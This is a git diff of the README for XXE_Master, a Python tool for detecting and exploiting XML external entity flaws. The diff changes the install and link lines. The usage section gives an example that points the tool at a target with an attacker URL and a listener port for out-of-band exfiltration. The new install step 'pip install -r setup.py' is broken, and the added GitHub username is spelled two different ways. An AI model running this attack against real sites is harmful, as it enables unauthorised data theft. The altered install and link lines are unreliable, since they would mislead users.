@@ -20,14 +20,14 @@ XXE_Master is a powerful tool designed for detecting, exploiting, and reporting 
 
 ## Requirements
 - Python 3.x
-- Required Python packages (listed in `requirements.txt`)
+- Required Python packages (listed in `setup.py`)
 
 ## Installation
 
 ### Installation Steps
-1. Clone the repository: `git clone https://github.com/your-username/xxe_master.git`
+1. Clone the repository: `git clone https://github.com/uwimanaMuhiziElie/xxe_master.git`
 2. Navigate to the project directory: `cd xxe_master`
-3. Install XXE_Master: `pip install -r requirements.txt`
+3. Install XXE_Master: `pip install -r setup.py`
 
 ## Usage
 - For usage instructions, run `python main.py --help`
@@ -42,7 +42,7 @@ XXE_Master is a powerful tool designed for detecting, exploiting, and reporting 
   - Example: `python main.py http://www.exampletest.com --attacker-url http://your-attacker-url.com --delay 5 --listen-port 9000`
 
 ## Troubleshooting
-- If you encounter any issues, please [open an issue](https://github.com/your-username/xxe_master/issues) on GitHub.
+- If you encounter any issues, please [open an issue](https://github.com/uwimanaMuhizieElie/xxe_master/issues) on GitHub.
 
 ## License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
